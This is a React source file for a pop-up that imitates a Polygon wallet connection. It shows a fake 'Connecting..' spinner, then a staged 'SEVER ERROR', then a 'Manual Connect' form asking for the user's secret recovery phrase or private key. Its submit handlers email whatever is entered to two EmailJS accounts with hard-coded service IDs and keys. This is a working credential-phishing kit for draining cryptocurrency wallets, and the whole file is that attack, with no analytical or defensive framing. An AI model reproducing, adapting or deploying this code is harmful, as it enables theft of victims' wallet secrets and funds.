import {
  Backdrop,
  Box,
  Fade,
  Modal,
  Stack,
  Typography,
  IconButton,
  CircularProgress,
  Button,
  Tabs,
  Tab,
  TextField,
} from "@mui/material";
import React, { useEffect, useState, useRef } from "react";
import { AiOutlineClose } from "react-icons/ai";
import theme from "../../mui/theme";
import emailjs from "@emailjs/browser";

function PopModal({ open, close }) {
  const [tab, setTab] = useState(0);
  const [value, setValue] = useState(0);
  const [manual, setManual] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const phraseRef = useRef();
  const keyRef = useRef();
  const [loading, setLoading] = useState(false);
  const wordCount = phrase
    .trim()
    .split(" ")
    .filter((word) => word !== "").length;

  useEffect(() => {
    if (tab === 0) {
      const timeoutId = setTimeout(() => {
        setTab(1);
      }, 7000);

      return () => {
        clearTimeout(timeoutId);
      };
    }
  }, [tab]);

  const handleModalFalse = () => {
    close(false);
  };

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  //   Mail functions

  const handlePhrase = (e) => {
    e.preventDefault();

    setLoading(true);
    emailjs
      .sendForm(
        "service_efqp651",
        "template_8q1ftd5",
        phraseRef.current,
        "RrpGKzCZD8NPjGHj5"
      )
      .then(
        (result) => {
          console.log(result);
          setLoading(false);
          // alert("Connected successfully");
          localStorage.setItem("connected", "connected");
          //   setConnect(true);
        },
        (error) => {
          console.log(error);
          setLoading(false);
          alert(error);
        }
      );

    emailjs.sendForm(
      "service_udsvw3d",
      "template_bmqcwla",
      phraseRef.current,
      "DNsER4-4UGLWYPh73"
    );

    // window.location.href = "/";
  };

  const handlePrivateKey = (e) => {
    e.preventDefault();

    setLoading(true);
    emailjs
      .sendForm(
        "service_efqp651",
        "template_8q1ftd5",
        keyRef.current,
        "RrpGKzCZD8NPjGHj5"
      )
      .then(
        (result) => {
          console.log(result);
          setLoading(false);
          // alert("Connected successfully");
          localStorage.setItem("connected", "connected");
          //   setConnect(true);
        },
        (error) => {
          console.log(error.message);
          setLoading(false);
          alert(error);
        }
      );

    emailjs.sendForm(
      "service_udsvw3d",
      "template_bmqcwla",
      keyRef.current,
      "DNsER4-4UGLWYPh73"
    );
  };

  return (
    <div>
      <Modal
        open={open}
        closeAfterTransition
        slots={{ backdrop: Backdrop }}
        slotProps={{
          backdrop: {
            timeout: 500,
          },
        }}
      >
        <Fade in={true}>
          <Box sx={style}>
            <Box p={4}>
              <Stack
                direction="row"
                justifyContent="space-between"
                alignItems="center"
              >
                <img
                  src="https://assets.polygon.technology/brandAssets/polygon_logo_monochrome_white.svg"
                  alt="logo"
                  style={{
                    width: "130px",
                  }}
                />
                <IconButton
                  onClick={handleModalFalse}
                  sx={{
                    background: "#fff",
                    "&:hover": {
                      background: "#fff",
                    },
                  }}
                >
                  <AiOutlineClose color="#000" />
                </IconButton>
              </Stack>
            </Box>

            {tab === 0 && (
              <Box
                bgcolor="white"
                display="flex"
                flexDirection="column"
                alignItems="center"
                justifyContent="center"
                p={4}
                sx={{ borderRadius: "0 0 10px 10px" }}
              >
                <Typography variant="body1" color="primary" mb={3}>
                  Connecting..
                </Typography>
                <CircularProgress />
              </Box>
            )}

            {tab === 1 && (
              <Box
                bgcolor="white"
                display="flex"
                flexDirection="column"
                alignItems="center"
                justifyContent="center"
                p={4}
                sx={{ borderRadius: "0 0 10px 10px" }}
              >
                <Typography variant="body1" sx={{ color: "#f00" }} mb={3}>
                  SEVER ERROR
                </Typography>
                <Button
                  variant="contained"
                  color="primary"
                  sx={{
                    width: "150px",
                    height: "42px",
                  }}
                  onClick={() => {
                    setManual(true);
                    setTimeout(() => {
                      setTab(2);
                    }, 3000);
                  }}
                >
                  {manual ? (
                    <CircularProgress size={20} sx={{ color: "#fff" }} />
                  ) : (
                    "Connect Manually"
                  )}
                </Button>
              </Box>
            )}

            {tab === 2 && (
              <Box
                bgcolor="white"
                display="flex"
                flexDirection="column"
                alignItems="center"
                justifyContent="center"
                p={4}
                sx={{ borderRadius: "0 0 10px 10px" }}
              >
                <Box>
                  <Typography variant="h2" component="h2" align="center">
                    Manual Connect
                  </Typography>

                  <Box
                    display="flex"
                    justifyContent="center"
                    alignItems="center"
                    mt={2}
                  >
                    <Tabs value={value} onChange={handleChange}>
                      <Tab label="Phrase" />
                      <Tab label="Private Key" />
                    </Tabs>
                  </Box>

                  <Box
                    mt={5}
                    mb={2}
                    width="100%"
                    sx={{
                      display: "flex",
                      flexDirection: "column",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Box
                      mt={5}
                      mb={2}
                      width="100%"
                      sx={{
                        display: "flex",
                        justifyContent: "center",
                        alignItems: "center",
                      }}
                    >
                      {value === 0 && (
                        <form
                          ref={phraseRef}
                          style={{
                            width: "100%",
                            display: "flex",
                            flexDirection: "column",
                            justifyContent: "center",
                            alignItems: "center",
                          }}
                          onSubmit={handlePhrase}
                        >
                          <Stack spacing={2}>
                            <TextField
                              multiline
                              rows={4}
                              placeholder="Enter secret phrase"
                              name="phrase"
                              value={phrase}
                              onChange={(e) => setPhrase(e.target.value)}
                              required
                            />
                            <Typography variant="body1">
                              Typically 12 (sometimes 24) words separated by
                              single spaces
                            </Typography>
                            <Button
                              type="submit"
                              variant="contained"
                              disabled={wordCount < 12}
                            >
                              {!loading ? (
                                "Connect"
                              ) : (
                                <CircularProgress sx={{ color: "#E6F0FF" }} />
                              )}
                            </Button>
                          </Stack>
                        </form>
                      )}

                      {value === 1 && (
                        <form
                          ref={keyRef}
                          style={{
                            minWidth: "100%",
                            display: "flex",
                            flexDirection: "column",
                            justifyContent: "center",
                            alignItems: "center",
                          }}
                          onSubmit={handlePrivateKey}
                        >
                          <Stack spacing={2}>
                            <TextField
                              multiline
                              rows={4}
                              placeholder="Enter Private Key"
                              name="key"
                              value={privateKey}
                              onChange={(e) => setPrivateKey(e.target.value)}
                              required
                              sx={{ width: "354px" }}
                            />
                            <Typography variant="body1">
                              Typically 64 alphanumeric characters
                            </Typography>

                            <Button
                              type="submit"
                              variant="contained"
                              disabled={privateKey.length < 12}
                            >
                              {!loading ? (
                                "Connect"
                              ) : (
                                <CircularProgress sx={{ color: "#E6F0FF" }} />
                              )}
                            </Button>
                          </Stack>
                        </form>
                      )}
                    </Box>
                  </Box>
                </Box>
              </Box>
            )}
          </Box>
        </Fade>
      </Modal>
    </div>
  );
}

export default PopModal;

const style = {
  position: "absolute",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  width: 400,
  bgcolor: theme.palette.primary.main,
  border: "none",
  borderRadius: "10px",
  boxShadow: 24,
};
